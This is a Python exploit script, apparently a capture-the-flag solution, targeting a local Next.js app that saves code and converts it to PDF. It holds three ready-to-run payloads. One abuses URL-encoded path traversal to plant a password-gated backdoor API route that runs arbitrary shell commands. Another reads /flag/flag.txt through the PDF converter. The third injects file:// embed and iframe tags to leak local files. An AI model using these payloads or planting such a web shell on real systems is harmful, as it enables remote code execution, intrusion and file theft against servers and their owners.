import requests
import time
import fitz

HOST = "http://localhost:3000"

def payload1():
    jsCode = """
import type { NextApiRequest, NextApiResponse } from 'next'

type Data = {
  status: string,
  message: string,
}

export default function handler(
  req: NextApiRequest,
  res: NextApiResponse<Data>
) {
  if (req.body.password !== "r4Has1a" || req.body.cmd === undefined) {
    return res.status(400).json({ status: 'failed', message: 'denied.' });
  }
  const cp = require("child_process");
  var child = cp.spawnSync(req.body.cmd, req.body.cmd_args);
  return res.status(200).json({ status: "ok", message: child.stdout.toString() });
}
    """
    data = {
        "code": jsCode,
        "target": {
            "href": "a",
            "origin": "a",
            "protocol": "file:",
            "hostname": "",
            "pathname": "code/%2e%2e/src/pages/api/inject.ts"
        }
    }

    print("[*] Injecting backdoor")
    resp = requests.post(f"{HOST}/api/save", json=data)
    print(resp.json())
    
    print("[*] Waiting compiling")
    time.sleep(50)

    print("[*] Executing backdoor")
    dataInject = {
        "password": "r4Has1a",
        "cmd": "cat",
        "cmd_args": ["/flag/flag.txt"]
    }
    resp = requests.post(f"{HOST}/api/inject", json=dataInject)
    print(resp.json())

def payload2():
    data = {
        "source": {
            "href": "a",
            "origin": "a",
            "protocol": "file:",
            "hostname": "",
            "pathname": "code/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/flag/flag%2etxt",
        }
    }
    resp = requests.post(f"{HOST}/api/convert", json=data)
    with open("flag.pdf", "wb") as pdfres:
        pdfres.write(resp.content)
    with fitz.open("flag.pdf") as pdfres:
        for page in pdfres:
            print(page.get_text())


def payload3():
    data = {
        "code": '<embed width="100%" src="file:///flag/flag%2etxt"></embed><iframe src="file:///flag/flag%2etxt"></iframe>',
        "target": "code/inj3ct10NNNNN"
    }
    resp = requests.post(f"{HOST}/api/save", json=data)
    print(resp.json())
    resp = requests.post(f"{HOST}/api/convert", json={'source': 'code/inj3ct10NNNNN'})
    with open("flag.pdf", "wb") as pdfres:
        pdfres.write(resp.content)
    with fitz.open("flag.pdf") as pdfres:
        for page in pdfres:
            print(page.get_text())

if __name__ == "__main__":
    num = input("Choose payload number [1-3]: ")
    globals()["payload" + num]()